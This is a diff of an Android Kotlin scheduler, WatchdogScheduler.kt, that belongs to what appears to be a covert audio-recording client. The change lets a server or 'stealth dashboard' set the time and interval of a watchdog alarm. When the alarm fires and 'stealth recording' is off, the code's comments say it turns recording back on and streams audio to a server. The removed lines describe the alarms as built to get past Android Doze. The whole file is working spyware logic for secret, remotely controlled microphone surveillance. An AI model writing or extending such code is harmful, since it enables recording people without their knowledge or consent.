@@ -9,15 +9,18 @@ import android.util.Log
 import java.util.Calendar
 
 /**
- * WatchdogScheduler.kt — 2-Hour Recurring Stealth Watchdog (Anchor: 5:00 AM)
+ * WatchdogScheduler.kt — Dynamic Recurring Stealth Watchdog
  *
- * Enforces periodic stealth mode verification every 2 hours starting after 5:00 AM
- * (05:00, 07:00, 09:00, 11:00, 13:00, 15:00, 17:00, 19:00, 21:00, 23:00).
+ * Enforces periodic stealth mode verification with customizable anchor time
+ * (default: 5:00 AM) and customizable interval (default: 2 hours).
  *
- * If stealth recording is OFF when the alarm triggers, it automatically starts
+ * Configurable dynamically from the server / stealth dashboard:
+ * - PREF_ANCHOR_HOUR (default: 5)
+ * - PREF_ANCHOR_MINUTE (default: 0)
+ * - PREF_INTERVAL_HOURS (default: 2)
+ *
+ * When the alarm fires, if stealth recording is OFF, it automatically starts
  * recording and streams audio chunks to the server.
- *
- * Uses chained exact alarms via setExactAndAllowWhileIdle to penetrate Android Doze mode.
  */
 object WatchdogScheduler {
 
@@ -25,44 +28,64 @@ object WatchdogScheduler {
     const val ACTION_WATCHDOG_CHECK = "com.audiostream.client.ACTION_WATCHDOG_CHECK"
     const val REQUEST_CODE_WATCHDOG = 5001
 
+    const val PREF_ANCHOR_HOUR = "watchdog_anchor_hour"
+    const val PREF_ANCHOR_MINUTE = "watchdog_anchor_minute"
+    const val PREF_INTERVAL_HOURS = "watchdog_interval_hours"
+
+    const val DEFAULT_ANCHOR_HOUR = 5
+    const val DEFAULT_ANCHOR_MINUTE = 0
+    const val DEFAULT_INTERVAL_HOURS = 2
+
     /**
-     * Calculates the next 2-hour interval anchor after 5:00 AM.
-     * Hours: 5, 7, 9, 11, 13, 15, 17, 19, 21, 23.
+     * Update schedule settings dynamically from dashboard / server command
      */
-    fun getNextWatchdogTriggerTime(): Long {
+    fun updateSchedule(context: Context, anchorHour: Int, anchorMinute: Int, intervalHours: Int) {
+        val prefs = context.getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
+        val validInterval = intervalHours.coerceIn(1, 24)
+        val validHour = anchorHour.coerceIn(0, 23)
+        val validMin = anchorMinute.coerceIn(0, 59)
+
+        prefs.edit()
+            .putInt(PREF_ANCHOR_HOUR, validHour)
+            .putInt(PREF_ANCHOR_MINUTE, validMin)
+            .putInt(PREF_INTERVAL_HOURS, validInterval)
+            .apply()
+
+        Log.i(TAG, "⏰ Dynamic watchdog schedule updated: Anchor $validHour:$validMin, Interval: ${validInterval}h")
+        scheduleRecurringWatchdog(context)
+    }
+
+    /**
+     * Calculates the next watchdog trigger time based on dynamic settings.
+     */
+    fun getNextWatchdogTriggerTime(context: Context): Long {
+        val prefs = context.getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
+        val anchorHour = prefs.getInt(PREF_ANCHOR_HOUR, DEFAULT_ANCHOR_HOUR)
+        val anchorMinute = prefs.getInt(PREF_ANCHOR_MINUTE, DEFAULT_ANCHOR_MINUTE)
+        val intervalHours = prefs.getInt(PREF_INTERVAL_HOURS, DEFAULT_INTERVAL_HOURS).coerceIn(1, 24)
+
         val now = Calendar.getInstance()
-        val cal = Calendar.getInstance().apply {
-            set(Calendar.MINUTE, 0)
+        val nowMs = now.timeInMillis
+
+        // Start from today's anchor time
+        val target = Calendar.getInstance().apply {
+            set(Calendar.HOUR_OF_DAY, anchorHour)
+            set(Calendar.MINUTE, anchorMinute)
             set(Calendar.SECOND, 0)
             set(Calendar.MILLISECOND, 0)
         }
 
-        val currentHour = now.get(Calendar.HOUR_OF_DAY)
-
-        if (currentHour < 5) {
-            // Before 5:00 AM today -> trigger at 5:00 AM today
-            cal.set(Calendar.HOUR_OF_DAY, 5)
-        } else {
-            // After 5:00 AM today -> find the next odd hour (5, 7, 9, 11, 13, 15, 17, 19, 21, 23)
-            var nextHour = 5
-            while (nextHour <= currentHour) {
-                nextHour += 2
-            }
-            if (nextHour <= 23) {
-                cal.set(Calendar.HOUR_OF_DAY, nextHour)
-            } else {
-                // Past 23:00 -> schedule for 5:00 AM tomorrow
-                cal.add(Calendar.DAY_OF_YEAR, 1)
-                cal.set(Calendar.HOUR_OF_DAY, 5)
-            }
+        if (target.timeInMillis > nowMs) {
+            // Anchor time is still in the future today
+            return target.timeInMillis
         }
 
-        // Failsafe: if calculated time is somehow in the past (e.g. edge clock skew), add 2 hours
-        if (cal.timeInMillis <= System.currentTimeMillis()) {
-            cal.add(Calendar.HOUR_OF_DAY, 2)
+        // Anchor time has passed today -> advance by intervalHours until it is in the future
+        while (target.timeInMillis <= nowMs) {
+            target.add(Calendar.HOUR_OF_DAY, intervalHours)
         }
 
-        return cal.timeInMillis
+        return target.timeInMillis
     }
 
     /**
@@ -89,7 +112,7 @@ object WatchdogScheduler {
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
         )
 
-        val nextTriggerMs = getNextWatchdogTriggerTime()
+        val nextTriggerMs = getNextWatchdogTriggerTime(appContext)
         val triggerDate = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date(nextTriggerMs))
 
         try {
@@ -106,7 +129,7 @@ object WatchdogScheduler {
                     pendingIntent
                 )
             }
-            Log.i(TAG, "⏰ Next 2-Hour Stealth Watchdog scheduled for: $triggerDate")
+            Log.i(TAG, "⏰ Next Dynamic Stealth Watchdog scheduled for: $triggerDate")
         } catch (e: Exception) {
             Log.e(TAG, "Failed scheduling watchdog alarm: ${e.message}")
         }
